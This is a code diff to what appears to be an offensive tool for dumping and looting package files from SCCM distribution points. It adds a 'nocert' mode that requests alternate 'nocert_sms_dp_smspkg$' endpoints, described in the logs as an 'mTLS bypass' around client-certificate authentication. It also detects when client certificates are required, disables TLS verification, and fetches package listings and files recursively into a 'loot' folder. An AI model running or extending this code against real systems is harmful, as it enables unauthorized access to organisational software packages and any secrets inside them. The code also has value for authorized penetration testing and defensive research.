@@ -24,7 +24,8 @@ class FileDumper():
                  username,
                  password,
                  pki_cert,
-                 pki_key
+                 pki_key,
+                 nocert
                 ):
         self.distribution_point = distribution_point
         self.output_dir = output_dir
@@ -36,6 +37,7 @@ class FileDumper():
         self.password = password
         self.pki_cert = pki_cert
         self.pki_key = pki_key
+        self.nocert = nocert
         self.use_https = True if self.distribution_point.startswith('https://') else False
         self.package_ids = set()
 
@@ -44,8 +46,11 @@ class FileDumper():
         if username is not None and password is not None:
             self.session.auth = HttpNtlmAuth(username, password)
         if self.use_https:
-            logger.info("[INFO] HTTPS required. Using client certificate authentication")
-            self.session.cert = (pki_cert, pki_key)
+            if nocert:
+                logger.info("[INFO] HTTPS required. Using nocert endpoint for mTLS bypass")
+            else:
+                logger.info("[INFO] HTTPS required. Using client certificate authentication")
+                self.session.cert = (pki_cert, pki_key)
             self.session.verify = False
 
 
@@ -63,17 +68,22 @@ class FileDumper():
 
 
     @staticmethod
-    def check_anonymous_DP_connection_enabled(distribution_point):
+    def check_anonymous_DP_connection_enabled(distribution_point, nocert):
         characters = string.ascii_letters
         random_string = ''.join(random.choice(characters) for i in range(8))
-
-        logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
-        r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS)
+        if nocert:
+            logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/nocert_sms_dp_smspkg$/{random_string}")
+            r = requests.get(f"{distribution_point}/nocert_sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS, verify=False)
+        else:
+            logger.info(f"[INFO] Checking anonymous DP Connection with URL {distribution_point}/sms_dp_smspkg$/{random_string}")
+            r = requests.get(f"{distribution_point}/sms_dp_smspkg$/{random_string}", headers=DP_DOWNLOAD_HEADERS, verify=False)
         logger.info(f"[INFO] Request returned status code {r.status_code}")
         if r.status_code == 404:
             return ANONYMOUSDP.ENABLED.value
         elif r.status_code == 401:
             return ANONYMOUSDP.DISABLED.value
+        elif r.status_code == 403:
+            return ANONYMOUSDP.CLIENTCERT.value
         else:
             return ANONYMOUSDP.UNKNOWN.value
 
@@ -81,8 +91,12 @@ class FileDumper():
     def check_credentials_before_download(self):
         characters = string.ascii_letters
         random_string = ''.join(random.choice(characters) for i in range(8))
-        logger.info(f"[INFO] Checking credentials with URL {self.distribution_point}/sms_dp_smspkg$/{random_string}")
-        r = self.session.get(f"{self.distribution_point}/sms_dp_smspkg$/{random_string}")
+        if self.nocert:
+            logger.info(f"[INFO] Checking credentials with URL {self.distribution_point}/nocert_sms_dp_smspkg/{random_string}")
+            r = self.session.get(f"{self.distribution_point}/nocert_sms_dp_smspkg$/{random_string}")
+        else:
+            logger.info(f"[INFO] Checking credentials with URL {self.distribution_point}/sms_dp_smspkg$/{random_string}")
+            r = self.session.get(f"{self.distribution_point}/sms_dp_smspkg$/{random_string}")
         logger.info(f"[INFO] Request returned status code {r.status_code}")
         if r.status_code == 404:
             return True
@@ -158,8 +172,11 @@ class FileDumper():
             self.handle_packages()
     
 
-    def fetch_package_ids_from_datalib(self):       
-        r = self.session.get(f"{self.distribution_point}/sms_dp_smspkg$/datalib")
+    def fetch_package_ids_from_datalib(self):
+        if self.nocert:
+            r = self.session.get(f"{self.distribution_point}/nocert_sms_dp_smspkg$/datalib")
+        else:
+            r = self.session.get(f"{self.distribution_point}/sms_dp_smspkg$/datalib")
         soup = BeautifulSoup(r.content, 'html.parser')
         for a in soup.find_all('a'):
             parts = a.get('href').split('/')
@@ -168,14 +185,17 @@ class FileDumper():
                 self.package_ids.add(last_part)
             
         logger.warning(f"{bcolors.OKGREEN}[+] Found {len(self.package_ids)} packages{bcolors.ENDC}")
-        logger.warning(self.package_ids)
+        logger.info(self.package_ids)
 
 
     def handle_packages(self):
         with open(f"loot/{self.output_dir}/index.txt", "a") as f:
             for i, package_id in enumerate(self.package_ids):
                 package_index = {package_id: {}}
-                self.recursive_package_directory_fetch(package_index[package_id], f"{self.distribution_point}/sms_dp_smspkg$/{package_id}", 0)
+                if self.nocert:
+                    self.recursive_package_directory_fetch(package_index[package_id], f"{self.distribution_point}/nocert_sms_dp_smspkg$/{package_id}", 0)
+                else:
+                    self.recursive_package_directory_fetch(package_index[package_id], f"{self.distribution_point}/sms_dp_smspkg$/{package_id}", 0)
                 FileDumper.print_tree(package_index, f)
                 to_download = self.recursive_file_extract(package_index[package_id])
                 if len(to_download) == 0:
